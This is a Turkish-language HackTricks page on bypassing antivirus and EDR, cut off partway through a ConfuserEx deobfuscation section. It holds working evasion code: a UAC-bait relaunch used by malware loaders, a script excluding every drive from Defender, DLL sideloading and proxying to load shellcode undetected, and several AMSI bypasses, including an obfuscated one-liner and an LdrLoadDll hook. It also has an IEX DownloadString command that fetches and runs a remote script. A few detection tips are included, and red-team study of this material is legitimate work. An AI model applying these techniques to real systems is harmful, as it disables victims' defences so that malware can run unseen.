# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p) **tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmak için kullanılan bir tool.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV taklidi yaparak Windows Defender'ın çalışmasını durdurmak için kullanılan bir tool.
- [Admin iseniz Defender'ı devre dışı bırakma](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce Installer tarzı UAC bait

Game cheat gibi görünen public loader'lar genellikle önce **kullanıcıdan elevation ister**, ardından Defender'ı etkisiz hâle getiren unsigned Node.js/Nexe installer'lar olarak dağıtılır. Akış basittir:

1. `net session` ile administrative context kontrol edilir. Bu command yalnızca çağıran admin haklarına sahip olduğunda başarılı olur; dolayısıyla başarısızlık, loader'ın standard user olarak çalıştığını gösterir.
2. Orijinal command line'ı korurken beklenen UAC consent prompt'unu tetiklemek için kendisini hemen `RunAs` verb'üyle yeniden başlatır.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Kurbanlar zaten “cracked” yazılım yüklediklerine inandıkları için istem genellikle kabul edilir ve bu da malware’e Defender’ın policy’sini değiştirmek için ihtiyaç duyduğu hakları verir.<sup>[[26]](#references)</sup>

### Her sürücü harfi için kapsamlı `MpPreference` exclusions

Yetki yükseltildikten sonra GachiLoader-style zincirleri, servisi tamamen devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog’unu (`taskkill /F /IM SecHealthUI.exe`) sonlandırır ve ardından **son derece geniş exclusions** uygular; böylece her kullanıcı profili, sistem dizini ve çıkarılabilir disk taranamaz hale gelir:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Temel gözlemler:

- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) dolaşır; bu nedenle **diske herhangi bir yere bırakılacak gelecekteki payload'lar göz ardı edilir**.
- `.sys` uzantısı hariç tutması geleceğe yöneliktir; **saldırganlar Defender'a tekrar dokunmadan daha sonra imzasız driver'ları yükleme seçeneğini saklı tutar**.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır; böylece sonraki aşamalar hariç tutmaların kalıcı olduğunu doğrulayabilir veya UAC'yi yeniden tetiklemeden bunları genişletebilir.

Hiçbir Defender service durdurulmadığı için basit health check'ler, gerçek zamanlı inceleme bu yollara hiç dokunmasa bile “antivirus active” bildirmeye devam eder.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Günümüzde AV'ler bir dosyanın malicious olup olmadığını kontrol etmek için farklı yöntemler kullanır: static detection, dynamic analysis ve daha gelişmiş EDR'ler için behavioural analysis.

### **Static detection**

Static detection, bir binary veya script içindeki bilinen malicious string'leri ya da byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (ör. dosya açıklaması, şirket adı, digital signature'lar, icon, checksum vb.) gerçekleştirilir. Bu, bilinen public tool'ları kullanmanın daha kolay yakalanmanıza neden olabileceği anlamına gelir; çünkü bu araçlar muhtemelen analiz edilmiş ve malicious olarak işaretlenmiştir. Bu tür bir detection'ı aşmanın birkaç yolu vardır:

- **Encryption**

Binary'yi encrypt ederseniz AV'nin programınızı detection etmesinin bir yolu kalmaz; ancak programı decrypt edip memory'de çalıştırmak için bir loader'a ihtiyacınız olacaktır.

- **Obfuscation**

Bazen binary veya script'inizdeki bazı string'leri değiştirmeniz, onu AV'yi geçirecek hale getirmek için yeterlidir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu zaman alıcı bir işlem olabilir.

- **Custom tooling**

Kendi tool'larınızı geliştirirseniz bilinen kötü signature'lar bulunmaz; ancak bu çok fazla zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender static detection'a karşı kontrol yapmak için [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanmanızı öneririm. Temel olarak dosyayı birden fazla segmente böler ve ardından Defender'dan her birini ayrı ayrı scan etmesini ister; bu sayede binary'nizde hangi string'lerin veya byte'ların işaretlendiğini tam olarak söyleyebilir.

Pratik AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)'e göz atmanızı kesinlikle öneririm.

### **Dynamic analysis**

Dynamic analysis, AV'nin binary'nizi bir sandbox'ta çalıştırması ve malicious activity'yi izlemesidir (ör. browser'ınızın password'lerini decrypt edip okumaya çalışma, LSASS üzerinde minidump alma vb.). Bu kısımla çalışmak biraz daha zor olabilir; ancak sandbox'ları evade etmek için yapabileceğiniz bazı şeyler şunlardır:

- **Execution'dan önce sleep** Nasıl implement edildiğine bağlı olarak bu, AV'nin dynamic analysis'ini bypass etmek için harika bir yol olabilir. AV'lerin dosyaları scan etmek için kullanıcının workflow'unu kesintiye uğratmamak adına çok kısa bir zamanı vardır; bu nedenle uzun sleep'ler binary'lerin analizini sekteye uğratabilir. Sorun şu ki birçok AV sandbox'ı, nasıl implement edildiğine bağlı olarak sleep'i atlayabilir.
- **Machine resource'larını kontrol etme** Genellikle sandbox'ların kullanabileceği çok az resource bulunur (ör. < 2GB RAM); aksi takdirde kullanıcının machine'ını yavaşlatabilirler. Burada oldukça creative de olabilirsiniz; örneğin CPU'nun sıcaklığını veya fan hızlarını kontrol edebilirsiniz, bunların tamamı sandbox'ta implement edilmiş olmayacaktır.
- **Machine-specific check'ler** Workstation'ı "contoso.local" domain'ine joined olan bir kullanıcıyı hedeflemek istiyorsanız, computer'ın domain'ini kontrol ederek belirttiğiniz domain ile eşleşip eşleşmediğini görebilirsiniz; eşleşmiyorsa programınızın çıkmasını sağlayabilirsiniz.

Microsoft Defender'ın Sandbox computername'inin HAL9TH olduğu ortaya çıktı; dolayısıyla detonation'dan önce malware'inizde computer name'i kontrol edebilirsiniz. İsim HAL9TH ile eşleşiyorsa Defender'ın sandbox'ının içindesiniz demektir; bu durumda programınızın çıkmasını sağlayabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı kullanılabilecek [@mgeeky](https://twitter.com/mariuszbit) tarafından paylaşılan diğer oldukça iyi ipuçları:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Bu post'ta daha önce söylediğimiz gibi **public tool'lar** sonunda **detected olacaktır**; bu nedenle kendinize şu soruyu sormalısınız:

Örneğin LSASS'ı dump etmek istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS'ı dump eden farklı bir project kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. mimikatz'ı örnek alırsak bu tool muhtemelen AV'ler ve EDR'ler tarafından en çok flag'lenen malware'lerden biridir; project'in kendisi oldukça başarılı olsa da AV'leri aşmak için onunla çalışmak bir nightmare'dir. Bu nedenle gerçekleştirmeye çalıştığınız şey için alternatifler arayın.

> [!TIP]
> Payload'larınızı evasion için modify ederken Defender'da **automatic sample submission'ı kapattığınızdan** emin olun ve lütfen, uzun vadede evasion elde etmek istiyorsanız, **VIRUSTOTAL'A UPLOAD ETMEYİN**. Payload'ınızın belirli bir AV tarafından detected edilip edilmediğini kontrol etmek istiyorsanız AV'yi bir VM'ye install edin, automatic sample submission'ı kapatmayı deneyin ve sonuçtan memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda evasion için her zaman **DLL kullanmaya öncelik verin**; deneyimlerime göre DLL dosyaları genellikle **çok daha az detected edilir** ve analiz edilir. Bu nedenle, payload'ınızın DLL olarak çalıştırılabilecek bir yolu varsa bazı durumlarda detection'dan kaçınmak için kullanabileceğiniz çok basit bir trick'tir.

Bu image'da görebileceğimiz gibi, Havoc'tan alınan bir DLL Payload antiscan.me'de 4/26 detection rate'e sahipken EXE payload'ın detection rate'i 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Şimdi DLL dosyalarıyla kullanabileceğiniz ve çok daha stealthier olmanızı sağlayacak bazı trick'leri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, victim application ile malicious payload(lar)ı yan yana konumlandırarak loader tarafından kullanılan DLL search order'dan yararlanır.

DLL Sideloading'e susceptible program'ları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, `"C:\Program Files\\"` içindeki DLL hijacking'e karşı savunmasız programların ve yüklemeye çalıştıkları DLL dosyalarının listesini görüntüler.

**DLL Hijackable/Sideloadable programları kendiniz incelemenizi** önemle tavsiye ederim. Bu teknik doğru şekilde uygulandığında oldukça gizlidir; ancak herkese açık olarak bilinen DLL Sideloadable programlarını kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği ada sahip kötü amaçlı bir DLL'yi yerleştirmek payload'unuzu çalıştırmaz; çünkü program, bu DLL'nin içinde belirli işlevlerin bulunmasını bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, bir programın yaptığı çağrıları proxy (ve kötü amaçlı) DLL'den orijinal DLL'ye yönlendirir. Böylece programın işlevselliği korunurken payload'unuzun çalıştırılmasını yönetmeniz mümkün olur.

[ @flangvik](https://twitter.com/Flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Bunlar sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem [SGN](https://github.com/EgeBalci/sgn) ile encode edilmiş shellcode'umuzun hem de proxy DLL'in [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate değeri var! Buna başarılı diyebiliriz.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)'unu ve ele aldığımız konuyu daha derinlemesine öğrenmek için [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)'yu **şiddetle izlemenizi** tavsiye ederim.

### Forwarded Exports Kötüye Kullanımı (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan işlevleri export edebilir: export girdisi kodu işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir caller export'u resolve ettiğinde Windows loader şunları yapar:

- Henüz yüklenmemişse `TargetDll`'yi yükler
- `TargetFunc`'yi buradan resolve eder

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise, korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse normal DLL search order kullanılır; buna forward resolution işlemini gerçekleştiren modülün dizini de dahildir.

Bu, dolaylı bir sideloading primitive'i sağlar: bir işlevi KnownDLL olmayan bir modül adına forward eden imzalı bir DLL bulun, ardından bu imzalı DLL'yi, forwarded target module ile tamamen aynı ada sahip attacker-controlled bir DLL ile aynı dizine yerleştirin. Forwarded export çağrıldığında loader forward'ı resolve eder ve DLL'inizi aynı dizinden yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen örnek:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre çözümlenir.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod yürütmeyi sağlamak için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için yönlendirilen işlevi uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İletmeyi imzalı bir LOLBin ile tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed), side-by-side `keyiso.dll` dosyasını (signed) yükler
- `KeyIsoSetAuditingInterface` çözümlenirken loader, `NCRYPTPROV.SetAuditingInterface` forward'ını takip eder
- Ardından loader, `C:\test` konumundaki `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, "missing API" hatasını yalnızca `DllMain` zaten çalıştıktan sonra alırsınız

Hunting tips:
- Hedef module'ün KnownDLL olmadığı forwarded exports'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded exports'ları aşağıdakiler gibi araçlarla enumerate edebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Detection/defense fikirleri:
- LOLBins'lerin (ör. rundll32.exe) sistem dışı yollardan imzalı DLL'ler yüklemesini ve ardından aynı base name'e sahip KnownDLLs olmayan DLL'leri bu dizinden yüklemesini izleyin
- Şu tür process/module chain'leri için uyarı oluşturun: `rundll32.exe` → kullanıcı tarafından yazılabilir yollar altındaki sistem dışı `keyiso.dll` → `NCRYPTPROV.dll`
- Code integrity policy'lerini (WDAC/AppLocker) uygulayın ve application dizinlerinde write+execute işlemlerini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i shellcode'unuzu gizli bir şekilde yüklemek ve çalıştırmak için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion yalnızca bir kedi-fare oyunudur; bugün çalışan bir şey yarın tespit edilebilir. Bu nedenle hiçbir zaman yalnızca tek bir araca güvenmeyin ve mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.

## Direct/Indirect Syscalls ve SSN Resolution (SysWhispers4)

EDR'ler genellikle `ntdll.dll` syscall stub'larına **user-mode inline hook**'ları yerleştirir. Bu hook'ları bypass etmek için doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export entrypoint'i çalıştırmadan kernel mode'a geçiş yapan **direct** veya **indirect syscall stub**'ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Invocation seçenekleri:**
- **Direct (embedded)**: Oluşturulan stub'a bir `syscall`/`sysenter`/`SVC #0` instruction'ı ekler (`ntdll` export'larına erişilmez).
- **Indirect**: Kernel geçişinin `ntdll`'den kaynaklanıyormuş gibi görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrıda bir gadget pool'undan gadget seçer.
- **Egg-hunt**: Statik `0F 05` opcode sequence'ını diske gömmekten kaçınır; bir syscall sequence'ını runtime sırasında çözer.

**Hook-resistant SSN resolution stratejileri:**
- **FreshyCalls (VA sort)**: Stub byte'larını okumak yerine syscall stub'larını virtual address'e göre sıralayarak SSN'leri çıkarır.
- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` map'ler, SSN'leri dosyanın `.text` bölümünden okur ve ardından unmap eder (bellekteki tüm hook'ları bypass eder).
- **RecycledGate**: VA-sorted SSN inference'ı, bir stub temiz olduğunda opcode validation ile birleştirir; hook'lanmışsa VA inference'a geri döner.
- **HW Breakpoint**: `syscall` instruction'ı üzerinde DR0 ayarlar ve hook'lanmış byte'ları parse etmeden runtime sırasında `EAX` içindeki SSN'yi yakalamak için bir VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" saldırılarını önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu; bu nedenle payload'ları bir şekilde **doğrudan bellekte** çalıştırabilirseniz AV bunu önlemek için hiçbir şey yapamıyordu, çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumu için elevation)
- PowerShell (script'ler, etkileşimli kullanım ve dinamik kod değerlendirmesi)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA macro'ları

Antivirus çözümlerinin script içeriklerini hem şifrelenmemiş hem de obfuscate edilmemiş biçimde açığa çıkararak script davranışlarını incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` çalıştırıldığında Windows Defender aşağıdaki alert'i üretir.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` önekini ve ardından script'in çalıştığı executable'ın path'ini eklediğine dikkat edin; bu örnekte bu dosya powershell.exe'dir.

Diske herhangi bir dosya bırakmadık, ancak AMSI nedeniyle yine de in-memory yakalandık.

Ayrıca **.NET 4.8** ile başlayan sürümlerde C# kodu da AMSI üzerinden çalıştırılır. Bu durum, in-memory execution yüklemek için kullanılan `Assembly.Load(byte[])` işlemini bile etkiler. Bu nedenle AMSI'yi evade etmek istiyorsanız in-memory execution için daha düşük .NET sürümlerinin (4.7.2 veya altı gibi) kullanılması önerilir.

AMSI'yi aşmanın birkaç yolu vardır:

- **Obfuscation**

AMSI temel olarak static detection'larla çalıştığından, yüklemeye çalıştığınız script'leri değiştirmek detection'dan evade etmek için iyi bir yöntem olabilir.

Ancak AMSI, birden fazla katmanı olsa bile script'leri unobfuscate edebilir; bu nedenle obfuscation, nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu durum evade etmeyi o kadar da straightforward olmaktan çıkarır. Yine de bazen birkaç variable adını değiştirmeniz yeterli olur; dolayısıyla bu, bir şeyin ne ölçüde flag'lendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) process'ine bir DLL yüklenerek uygulandığından, unprivileged bir user olarak çalışırken bile kolayca tamper edilebilir. AMSI'nin implementation'ındaki bu flaw nedeniyle araştırmacılar AMSI scanning'i evade etmek için birden fazla yöntem bulmuştur.

**Forcing an Error**

AMSI initialization'ını fail etmeye zorlamak (amsiInitFailed), mevcut process için hiçbir scan başlatılmamasını sağlar. Bu durum ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından disclosed edildi ve Microsoft daha yaygın kullanımı önlemek için bir signature geliştirdi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
PowerShell kodunda yalnızca bir satır kullanmak, mevcut PowerShell process'i için AMSI'yi kullanılamaz hâle getirmeye yetti. Elbette bu satırın kendisi AMSI tarafından flag'lendi; dolayısıyla bu tekniği kullanabilmek için bazı değişiklikler gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Bu gönderi yayımlandığında muhtemelen flag edileceğini unutmayın; bu nedenle planınız undetected kalmaksa herhangi bir code yayımlamamalısınız.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedilmiştir. Teknik, amsi.dll içindeki (kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu) "AmsiScanBuffer" function adresini bulmayı ve bunu E_INVALIDARG code'unu döndürecek instructions ile üzerine yazmayı içerir. Böylece gerçek scan'in sonucu 0 döner ve bu değer temiz bir sonuç olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

AMSI'ı powershell ile bypass etmek için kullanılan birçok başka teknik de vardır. Bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repo'ya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### amsi.dll yüklemesini engelleyerek AMSI'ı blocking (LdrLoadDll hook)

AMSI yalnızca `amsi.dll` mevcut process'e yüklendikten sonra initialize edilir. Sağlam ve language‑agnostic bir bypass yöntemi, user-mode hook'u `ntdll!LdrLoadDll` üzerine yerleştirerek istenen module `amsi.dll` olduğunda error döndürmektir. Bunun sonucunda AMSI hiçbir zaman yüklenmez ve bu process için hiçbir scan gerçekleşmez.<sup>[[23]](#references)</sup>

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve custom loader'lar genelinde çalışır (aksi takdirde AMSI'yi yükleyecek her şey).
- Uzun command-line artefact'larından kaçınmak için script'leri stdin üzerinden beslemeyle (`PowerShell.exe -NoProfile -NonInteractive -Command -`) birlikte kullanın.
- LOLBins üzerinden yürütülen loader'larda kullanıldığı görülmüştür (ör. `regsvr32` tarafından `DllRegisterServer` çağrılması).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI'yi bypass etmek için script oluşturur.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da rastgeleleştirilmiş user-defined function, değişkenler ve karakter ifadeleri kullanarak ve signature'dan kaçınmak için PowerShell keyword'lerinde rastgele karakter büyük/küçük harf kullanımı uygulayarak signature'dan kaçınan AMSI bypass script'leri oluşturur.

**Algılanan signature'ı kaldırma**

Mevcut process'in memory'sinden algılanan AMSI signature'ını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi bir tool kullanabilirsiniz. Bu tool, mevcut process'in memory'sini AMSI signature'ı için tarar ve ardından signature'ı NOP instruction'larıyla üzerine yazarak effectively memory'den kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell version 2 kullanın**
PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını loglamanızı sağlayan bir özelliktir. Bu, auditing ve troubleshooting amaçları için yararlı olabilir; ancak **tespitten kaçınmak isteyen saldırganlar için bir sorun da oluşturabilir**.

PowerShell logging'i bypass etmek için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **Powershell version 2 kullanın**: PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Unmanaged PowerShell session kullanın**: `powershell.exe` başlatmadan PowerShell'i barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` tarafından kullanılan yaklaşım). Bu, özellikle `powershell.exe` process'ine bağlı kontrollerden kaçınır; ancak AMSI'yi, Script Block Logging'i veya diğer tüm PowerShell savunmalarını kendiliğinden devre dışı bırakmaz. Kapsam, runtime'a ve host implementasyonuna bağlıdır.


## Obfuscation

> [!TIP]
> Birkaç obfuscation tekniği verileri encrypt etmeye dayanır. Bu da binary'nin entropy'sini artırarak AV'lerin ve EDR'lerin onu tespit etmesini kolaylaştırır. Buna dikkat edin ve encryption'ı yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulamayı değerlendirin.

### ConfuserEx-Protected .NET Binaries Deobfuscating

ConfuserEx 2 (veya commercial fork'lar) kullanan malware'i analiz ederken decompiler'ları ve sandbox'ları engelleyen birkaç protection katmanıyla karşılaşmak yaygındır. Aşağıdaki workflow, daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilen, **orijinale yakın bir IL'i güvenilir şekilde geri oluşturur**.<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserEx her *method body*'yi encrypt eder ve bunu *module* static constructor'ı (`<Module>.cctor`) içinde decrypt eder. Ayrıca PE checksum'ını patch'ler; bu nedenle yapılan herhangi bir değişiklik binary'nin crash olmasına neden olur. Encrypt edilmiş metadata tablolarını bulmak, XOR key'lerini kurtarmak ve temiz bir assembly'yi yeniden yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
